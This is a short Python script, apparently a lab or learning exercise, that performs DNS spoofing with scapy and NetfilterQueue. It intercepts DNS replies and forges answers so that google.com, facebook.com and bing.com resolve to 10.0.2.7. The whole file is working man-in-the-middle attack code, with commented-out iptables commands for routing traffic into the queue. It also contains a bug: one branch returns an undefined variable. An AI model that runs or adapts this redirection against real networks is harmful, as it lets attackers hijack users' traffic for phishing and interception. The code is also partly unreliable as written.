from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
from scapy.layers.dns import *
from scapy.layers.dot11 import *

dns_hosts = {
    b"www.google.com.": "10.0.2.7",
    b"google.com.": "10.0.2.7",
    b"facebook.com.": "10.0.2.7",
    b"bing.com.": "10.0.2.7",
    b"www.bing.com.": "10.0.2.7"
}


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


def modify_packet(scapy_packet):
    qname = scapy_packet[DNSQR].qname
    if qname not in dns_hosts:
        return packet
    print("[+] Spoofing Target")
    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    scapy_packet[DNS].ancount = 1
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum
    return scapy_packet

QUEUE_NUM = 0
#os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
#os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
queue = NetfilterQueue()

try:
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
#    os.system("iptables --flush")
    print("error occured")
